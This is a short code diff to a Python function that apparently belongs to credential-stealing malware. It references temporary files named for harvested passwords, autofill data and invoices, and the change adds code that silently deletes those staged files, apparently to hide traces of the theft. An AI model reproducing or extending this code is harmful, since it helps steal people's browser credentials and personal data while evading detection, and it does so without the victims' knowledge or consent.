@@ -2042,7 +2042,11 @@ def paaz(filetype):
             file2 = os.getenv("TEMP") + f"\wppassw.txt"
             file3 = os.getenv("TEMP") + f"\wpautofill.txt"
             file4 = os.getenv("TEMP") + '\winvs.txt'
-
+            ss = [file, file2,file3,file4]
+            for item in ss:
+                try:
+                    os.remove(item)
+                except:pass
 
         except Exception as e:
             pass
